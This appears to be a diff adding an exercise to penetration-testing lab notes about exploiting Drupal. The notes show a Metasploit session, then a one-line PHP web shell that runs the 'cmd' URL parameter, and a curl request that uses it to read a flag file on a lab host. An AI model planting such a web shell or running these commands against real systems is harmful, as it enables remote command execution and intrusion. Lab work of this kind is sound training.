@@ -120,3 +120,20 @@ msf6 exploit(multi/http/drupal_drupageddon3) > show options
 exploit
 sysinfo
 ```
+
+
+# Exercise
+```php
+`<?php`
+
+`echo "<pre>";`
+
+`echo shell_exec($_GET['cmd']);`
+
+`echo "</pre>";`
+
+`?>`
+```
+```bash
+curl -s "http://drupal-qa.inlanefreight.local/node/3?cmd=cat%20/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt" | grep -A2 "<pre>"
+```
